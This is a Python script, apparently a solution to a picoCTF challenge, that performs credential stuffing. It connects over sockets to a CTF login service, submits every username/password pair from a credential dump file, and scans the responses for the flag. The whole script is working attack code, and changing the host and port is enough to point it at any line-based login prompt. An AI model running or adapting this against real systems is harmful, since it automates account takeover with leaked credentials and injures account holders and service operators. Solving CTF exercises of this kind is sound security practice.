"""Sequential credential stuffing with rate-limit handling."""
import socket
import re
import time

HOST = "crystal-peak.picoctf.net"
PORT = 52020
CREDS_FILE = "creds-dump.txt"

def try_credential(user, pwd, timeout=5):
    """Try a single credential. Returns full response text."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, PORT))
        # Read until "Username: "
        data = b""
        while b"Username: " not in data:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        # Send username
        s.sendall((user + "\n").encode())
        # Read until "Password: "
        while b"Password: " not in data:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        # Send password
        s.sendall((pwd + "\n").encode())
        # Read response - wait longer
        time.sleep(0.5)
        response = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                response += chunk
        except socket.timeout:
            pass
        s.close()
        return (data + response).decode("utf-8", errors="replace")
    except Exception as e:
        return f"ERROR: {e}"

# Read credentials
creds = []
with open(CREDS_FILE, "r", errors="replace") as f:
    for line in f:
        line = line.strip()
        if ";" in line:
            user, pwd = line.split(";", 1)
            creds.append((user.strip(), pwd.strip()))

print(f"[*] Loaded {len(creds)} credential pairs")
print(f"[*] Starting sequential credential stuffing...")

found_flag = None
for i, (user, pwd) in enumerate(creds):
    if i % 50 == 0:
        print(f"  [{i}/{len(creds)}] Trying...")
    response = try_credential(user, pwd)
    # Check for flag
    if "picoCTF{" in response:
        print(f"\n[+] FLAG FOUND at #{i}: {user}:{pwd}")
        print(f"    Full response: {response}")
        flag_match = re.search(r'picoCTF\{[^}]+\}', response)
        if flag_match:
            found_flag = flag_match.group()
            break
    # Also log non-standard responses
    lower = response.lower()
    if "invalid" not in lower and "incorrect" not in lower and "wrong" not in lower and "failed" not in lower and "error" not in lower:
        if len(response) > 50:  # More than just the prompt
            print(f"  [?] Unusual response at #{i} ({user}:{pwd}): {response[:200]}")

if found_flag:
    print(f"\n[+] FLAG: {found_flag}")
else:
    print(f"\n[-] No flag found after {len(creds)} attempts")
